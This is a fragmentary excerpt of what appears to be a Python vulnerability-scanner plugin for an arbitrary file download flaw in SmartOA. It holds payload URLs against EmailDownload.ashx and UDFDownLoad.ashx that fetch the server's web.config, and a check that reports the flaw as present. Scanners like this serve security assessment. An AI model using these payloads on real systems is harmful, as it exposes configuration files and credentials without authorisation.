...
class smartoa_multi_filedownload:
        ...
        try:
            ...
            for payload in [r"/file/EmailDownload.ashx?url=~/web.config&name=web.config", r"/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
                ...
                if req.headers["Content-Type"] == "application/xml":
                    printGreen("[+]Success:存在smartoa任意文件下载漏洞...(高危)\tpayload: "+vulnurl)
                    noexist = False
            if noexist:
                printBlue("[-]Info:不存在smartoa_multi_filedownload漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = smartoa_multi_filedownload(sys.argv[1])
    testVuln.run()